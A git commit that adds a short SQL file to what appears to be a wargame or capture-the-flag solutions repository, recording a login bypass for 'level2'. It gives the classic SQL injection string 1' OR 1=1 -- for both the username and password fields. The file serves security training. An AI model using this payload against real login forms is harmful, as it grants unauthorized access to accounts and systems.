6821a1168ed16567f6be678ef5476e6fa7c5a7e2
isaac petersen <isaac.petersen5@gmail.com>
2022-06-17 10:51:52 -0700

    level2

---
+++ tigerlabs-overthewire/level2.sql
@@ -0,0 +1,7 @@
+-- this problem is a simple login bypass using a well known injection for the username and password fields
+
+-- for the username we used:
+1' OR 1=1 --
+
+-- for the password we used:
+1' OR 1=1 --
